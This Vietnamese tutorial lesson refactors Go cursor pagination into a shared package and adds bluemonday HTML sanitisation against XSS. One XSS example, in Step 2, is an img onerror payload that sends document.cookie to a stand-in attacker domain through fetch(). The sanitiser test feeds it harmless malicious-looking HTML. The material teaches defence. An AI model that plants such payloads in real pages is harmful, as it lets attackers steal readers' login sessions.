# Bài 3.01: Gói phân trang dùng chung và lọc HTML bằng bluemonday

> [← Phần 02](../02-noi-dung-xem-nghe/12-trinh-phat-youtube.md) · [Mục lục](../README.md) · [Bài sau →](02-schema-tin-tuc.md)

## Mục tiêu

- Mã hoá con trỏ phân trang thành gói `pkg/pagination`, dùng chung cho media và tin tức.
- Gói `pkg/sanitize` lọc HTML thân bài viết để chặn XSS.

## Bạn sẽ học

- **Refactor khi có lần dùng thứ hai**: viết lần đầu ngay trong module, khi module thứ hai cần thì
  mới tách ra gói chung. Không tách sớm khi chưa biết nó sẽ được dùng thế nào.
- **XSS** là gì, vì sao HTML do người nhập phải được lọc, và lọc ở đâu.
- Lỗ hổng có thể nằm ngay trong thư viện **dùng để bảo mật**.

## Viết code

### Bước 1: `backend/pkg/pagination/cursor.go`

Phần 02 viết `encodeCursor`/`decodeCursor` ngay trong `internal/media/service.go`. Tin tức cũng phân
trang con trỏ, nên tách ra:

```go
// Package pagination: con trỏ phân trang dạng chuỗi "đen" (opaque) dùng chung cho mọi danh sách.
//
// Con trỏ là vị trí dòng cuối của trang trước (vd. {published_at, id}), mã hoá JSON → base64.
// Client chỉ gửi lại nguyên văn, không tự ghép hay sửa, nên đổi cấu trúc bên trong không làm
// hỏng client. Xem bài 2.05 về phân trang con trỏ.
package pagination

import (
	"encoding/base64"
	"encoding/json"

	"github.com/PhamVanPhuc2k2/airlife/backend/pkg/apperr"
)

var errInvalid = apperr.Invalid("invalid_cursor", "Con trỏ phân trang không hợp lệ")

// Encode mã hoá con trỏ. v là struct đơn giản (thời gian, số, uuid) nên Marshal không thể lỗi.
func Encode(v any) string {
	b, _ := json.Marshal(v)
	return base64.RawURLEncoding.EncodeToString(b)
}

// Decode giải mã s vào v (con trỏ tới struct). s rỗng = trang đầu: trả false, không lỗi.
func Decode(s string, v any) (bool, error) {
	if s == "" {
		return false, nil
	}
	b, err := base64.RawURLEncoding.DecodeString(s)
	if err != nil {
		return false, errInvalid
	}
	if err := json.Unmarshal(b, v); err != nil {
		return false, errInvalid
	}
	return true, nil
}
```

`Decode` nhận `v any` (con trỏ tới struct của từng module), nên mỗi module tự quyết con trỏ của nó gồm
những trường gì: media có `views` cho sắp xếp "xem nhiều", tin tức thì không.

Sửa `backend/internal/media/service.go`: bỏ hai hàm `encodeCursor`/`decodeCursor` ở cuối file, bỏ import
`encoding/base64`, `encoding/json`, dùng gói mới. Bản đầy đủ sau khi sửa:

```go
package media

import (
	"context"
	"regexp"
	"time"

	"github.com/google/uuid"
	"github.com/redis/go-redis/v9"

	"github.com/PhamVanPhuc2k2/airlife/backend/pkg/apperr"
	"github.com/PhamVanPhuc2k2/airlife/backend/pkg/pagination"
)

const (
	defaultLimit = 24
	maxLimit     = 60
)

// slug hợp lệ: chữ thường không dấu, số, gạch ngang. Chặn ký tự lạ ngay từ đầu.
var slugRe = regexp.MustCompile(`^[a-z0-9]+(?:-[a-z0-9]+)*$`)

type Service struct {
	repo *Repository
	rdb  *redis.Client
}

func NewService(repo *Repository, rdb *redis.Client) *Service {
	return &Service{repo: repo, rdb: rdb}
}

type ListParams struct {
	Category string // "" = mọi chuyên mục
	Tag      string // slug chip lọc, "" = tất cả
	Sort     string // "new" (mặc định) | "popular"
	Lineup   string // "2026-10": line-up phim tháng 10/2026
	Cursor   string // next_cursor của trang trước
	Limit    int
}

// cursor là vị trí dòng cuối của trang trước (mã hoá bằng pkg/pagination).
type cursor struct {
	Time  *time.Time `json:"t,omitempty"` // sort=new
	Views *int64     `json:"v,omitempty"` // sort=popular
	ID    uuid.UUID  `json:"id"`
}

func (s *Service) List(ctx context.Context, p ListParams) (Page, error) {
	f, err := p.filter()
	if err != nil {
		return Page{}, err
	}
	var cur cursor
	hasCur, err := pagination.Decode(p.Cursor, &cur)
	if err != nil {
		return Page{}, err
	}
	if hasCur && cur.ID == uuid.Nil {
		return Page{}, apperr.Invalid("invalid_cursor", "Con trỏ phân trang không hợp lệ")
	}

	// Lấy dư 1 dòng: có dòng thứ limit+1 nghĩa là còn trang sau.
	limit := f.Limit
	f.Limit++

	var items []Card
	switch p.Sort {
	case "", "new":
		var t *time.Time
		var id *uuid.UUID
		if hasCur {
			t, id = cur.Time, &cur.ID
		}
		items, err = s.repo.ListNew(ctx, f, t, id)
	case "popular":
		if f.Lineup != nil {
			return Page{}, apperr.Invalid("invalid_sort", "Line-up chỉ sắp xếp theo mới nhất")
		}
		var v *int64
		var id *uuid.UUID
		if hasCur {
			v, id = cur.Views, &cur.ID
		}
		items, err = s.repo.ListPopular(ctx, f, v, id)
	default:
		return Page{}, apperr.Invalid("invalid_sort", "sort chỉ nhận new hoặc popular")
	}
	if err != nil {
		return Page{}, err
	}

	page := Page{Items: items}
	if len(items) > int(limit) {
		page.Items = items[:limit]
		last := page.Items[len(page.Items)-1]
		next := cursor{ID: last.ID}
		if p.Sort == "popular" {
			next.Views = &last.ViewCount
		} else {
			next.Time = &last.PublishedAt
		}
		page.NextCursor = pagination.Encode(next)
	}
	return page, nil
}

func (s *Service) Featured(ctx context.Context, limit int32) ([]Card, error) {
	return s.repo.ListFeatured(ctx, limit)
}

func (s *Service) Get(ctx context.Context, slug string) (Detail, error) {
	if !slugRe.MatchString(slug) {
		return Detail{}, errNotFound
	}
	return s.repo.GetBySlug(ctx, slug)
}

// LineupMonths trả các tháng có line-up phim dạng "2026-10", mới nhất trước.
func (s *Service) LineupMonths(ctx context.Context) ([]string, error) {
	months, err := s.repo.LineupMonths(ctx)
	if err != nil {
		return nil, err
	}
	out := make([]string, 0, len(months))
	for _, m := range months {
		out = append(out, m.Format("2006-01"))
	}
	return out, nil
}

func (s *Service) Related(ctx context.Context, slug string, limit int32) ([]Card, error) {
	d, err := s.Get(ctx, slug)
	if err != nil {
		return nil, err
	}
	return s.repo.ListRelated(ctx, d.Category, d.ID, d.Tags, limit)
}

func (p ListParams) filter() (listFilter, error) {
	var f listFilter
	if p.Category != "" {
		if !slugRe.MatchString(p.Category) {
			return f, apperr.Invalid("invalid_category", "Chuyên mục không hợp lệ")
		}
		f.Category = &p.Category
	}
	if p.Tag != "" {
		if !slugRe.MatchString(p.Tag) {
			return f, apperr.Invalid("invalid_tag", "Bộ lọc không hợp lệ")
		}
		f.Tag = &p.Tag
	}
	if p.Lineup != "" {
		t, err := time.Parse("2006-01", p.Lineup)
		if err != nil {
			return f, apperr.Invalid("invalid_lineup", "Tháng line-up phải có dạng YYYY-MM")
		}
		f.Lineup = &t
	}
	switch {
	case p.Limit <= 0:
		f.Limit = defaultLimit
	case p.Limit > maxLimit:
		f.Limit = maxLimit
	default:
		f.Limit = int32(p.Limit) //nolint:gosec // đã chặn trong khoảng 1..maxLimit
	}
	return f, nil
}
```

### Bước 2: XSS và vì sao phải lọc HTML

Thân bài viết là HTML do biên tập viên nhập (trang quản trị ở Phần 12). Frontend chèn nguyên văn HTML
đó vào trang. Nếu thân bài có:

```html
<img src="x" onerror="fetch('https://ke-gian.com/?c=' + document.cookie)">
```

thì **mọi người đọc bài** đều chạy đoạn mã đó: lộ phiên đăng nhập, bị chèn quảng cáo… Đây là lỗi **XSS**
(Cross-Site Scripting). Tài khoản biên tập viên bị chiếm, hoặc chỉ dán nhầm HTML từ một trang khác, là đủ.

Lọc **khi ghi** vào database: chỉ giữ thẻ và thuộc tính an toàn. Dữ liệu trong DB luôn sạch, mọi nơi
đọc ra (web, app, email) đều an toàn mà không phải nhớ lọc lại.

### Bước 3: Cài bluemonday

```bash
docker compose run --rm --no-deps api go get github.com/microcosm-cc/bluemonday@v1.0.27
make vuln
```

`make vuln` báo ngay:

```text
Vulnerability #1: GO-2025-3595
    Found in: golang.org/x/net@v0.26.0
    Fixed in: golang.org/x/net@v0.38.0
```

bluemonday dùng bộ phân tích HTML của `golang.org/x/net` và kéo về bản cũ v0.26.0. Lỗ hổng này nằm
đúng ở bộ phân tích HTML, tức là phần dùng để **lọc** HTML. Thư viện bảo mật không tự động an toàn;
phải quét cả những gì nó kéo theo. Nâng lên bản mới nhất:

```bash
docker compose run --rm --no-deps api go get golang.org/x/net@v0.62.0
make tidy && make vuln      # No vulnerabilities found.
```

### Bước 4: `backend/pkg/sanitize/html.go`

```go
// Package sanitize lọc HTML do người dùng/biên tập viên nhập (thân bài viết, mô tả sản phẩm…).
//
// Frontend hiển thị thân bài bằng dangerouslySetInnerHTML: trình duyệt chạy MỌI thứ trong đó.
// Nếu thân bài chứa <script> hay <img src=x onerror="..."> thì mã đó chạy trên máy mọi người
// đọc bài (lỗi XSS: đánh cắp phiên đăng nhập, chèn quảng cáo…). Vì vậy lọc khi GHI vào
// database: chỉ giữ thẻ và thuộc tính an toàn, bỏ hết phần còn lại.
package sanitize

import "github.com/microcosm-cc/bluemonday"

// articlePolicy: chính sách cho nội dung bài viết, tạo một lần (policy dùng được đồng thời từ
// nhiều goroutine).
//
// UGCPolicy (User Generated Content) cho phép thẻ định dạng thường gặp: p, h2–h6, strong, em,
// ul/ol/li, blockquote, a, img, table…; bỏ script, style, iframe, form, mọi thuộc tính on*
// (onclick, onerror…) và link javascript:. Thêm:
//   - link mở tab mới có rel="noopener" (trang đích không điều khiển ngược được trang mình)
//   - link ra ngoài có rel="nofollow" (không "cho điểm SEO" link do người dùng chèn)
var articlePolicy = func() *bluemonday.Policy {
	p := bluemonday.UGCPolicy()
	p.RequireNoFollowOnLinks(true)
	p.AddTargetBlankToFullyQualifiedLinks(true)
	return p
}()

// ArticleHTML trả HTML đã lọc, an toàn để lưu và hiển thị.
func ArticleHTML(s string) string {
	return articlePolicy.Sanitize(s)
}
```

- **`UGCPolicy`**: chính sách có sẵn cho nội dung người dùng tạo (User Generated Content). Danh sách
  **cho phép** (allowlist): thẻ nào không có trong danh sách thì bị bỏ. Ngược lại với danh sách cấm
  (blocklist), vì kẻ gian luôn nghĩ ra thẻ/thuộc tính mới mà danh sách cấm chưa có.
- **Tạo policy một lần** (biến cấp gói): tạo policy tốn công, và một policy dùng được cùng lúc từ nhiều
  goroutine.

## Kiểm tra

Chạy thử bộ lọc với HTML độc hại. Thư mục bắt đầu bằng `_` bị `go build ./...` bỏ qua, nên dùng làm
chỗ thử tạm:

```bash
mkdir -p backend/cmd/_thu && cat > backend/cmd/_thu/main.go <<'EOF'
package main

import (
	"fmt"

	"github.com/PhamVanPhuc2k2/airlife/backend/pkg/sanitize"
)

func main() {
	fmt.Println(sanitize.ArticleHTML(`<h2>Tiêu đề</h2><p onclick="x()">Đoạn <strong>đậm</strong></p><script>alert(1)</script><img src="a.jpg" onerror="steal()"><a href="javascript:alert(1)">xấu</a> <a href="https://vnexpress.net">tốt</a>`))
}
EOF
docker compose run --rm --no-deps api go run ./cmd/_thu
rm -rf backend/cmd/_thu
```

Kết quả:

```html
<h2>Tiêu đề</h2><p>Đoạn <strong>đậm</strong></p><img src="a.jpg">xấu <a href="https://vnexpress.net" rel="nofollow noopener" target="_blank">tốt</a>
```

Mất `onclick`, `<script>`, `onerror`, link `javascript:`; giữ định dạng; link ngoài thêm `rel`, `target`.

```bash
make lint && make vuln
git add . && git commit -m "Gói pagination dùng chung, lọc HTML bằng bluemonday"
```

## Hay gặp lỗi

| Lỗi | Cách gỡ |
|---|---|
| Lọc xong mất cả ảnh, link | Dùng `StrictPolicy` (bỏ mọi thẻ) thay vì `UGCPolicy` |
| Lọc ở frontend thay vì backend | Kẻ gian gọi thẳng API, bỏ qua frontend. Lọc phải ở backend, lúc ghi |
| `go run ./cmd/_thu` báo `package ... is not in std` | Phải chạy trong container api (thư mục `backend/` là module Go) |
